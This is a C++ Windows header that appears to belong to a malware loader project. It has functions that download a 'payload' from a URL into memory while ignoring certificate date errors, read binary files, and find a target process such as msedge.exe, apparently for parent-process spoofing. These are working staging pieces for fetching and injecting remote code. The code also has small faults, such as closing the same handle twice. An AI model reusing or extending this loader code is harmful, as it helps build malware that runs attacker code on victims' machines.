#pragma once
#include <Windows.h>
#include <vector>
#include <TlHelp32.h>
#include <fstream>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
using namespace std;

vector<BYTE> DownloadPayloadFromURL(LPCWSTR UrlSource)
{
    vector<BYTE> PayloadBuffer;
    DWORD BufferSize = 1024; 
    DWORD TotalBytesRead = 0;
    DWORD BytesRead = 0;

    // Open the internet connection session
    HINTERNET hInternetOpenW = InternetOpenW(NULL, NULL, NULL, NULL, NULL);


    // Open handle to payload
    HINTERNET hInternetOpenUrlW = InternetOpenUrlW(
        hInternetOpenW,
        UrlSource,
        NULL,
        NULL,
        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        NULL);


    // Read the data and dynamically store it into the vector, resizing it. 
    do {
        // Resize the buffer to accommodate more data
        PayloadBuffer.resize(TotalBytesRead + BufferSize);

        // Read the data into the buffer starting at the end of data already read
        BOOL ReadFile = InternetReadFile(
            hInternetOpenUrlW,
            PayloadBuffer.data() + TotalBytesRead, // Pointer to the buffer at the offset of TotalBytesRead
            BufferSize,
            &BytesRead);

        if (!ReadFile) {
            // Handle read error
            DWORD dwError = GetLastError();
            cerr << "InternetReadFile failed with error: " << dwError << endl;
            break;
        }

        // Increment total bytes read
        TotalBytesRead += BytesRead;

    } while (BytesRead > 0); // Continue reading if there was data read

    // Resize the buffer to the actual size of the data read
    PayloadBuffer.resize(TotalBytesRead);

    // Closing the handlers
    InternetCloseHandle(hInternetOpenUrlW);
    InternetCloseHandle(hInternetOpenUrlW);

	// Close the internet connection
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    return PayloadBuffer;
}

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename, ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}

// This function will iterate every running process until it finds msedge.exe to retrieve it's PPID.
BOOL GetParentProcessPPID(LPCWSTR szProcessName, DWORD* dwProcessId)
{
    unsigned int dwSize;

    PROCESSENTRY32	Proc = {
        dwSize = sizeof(PROCESSENTRY32)
    };

    HANDLE hSnapShot = NULL;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    do {
        if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
            *dwProcessId = Proc.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapShot, &Proc));


    // Cleanup
    _EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL)
        return FALSE;
    return TRUE;
}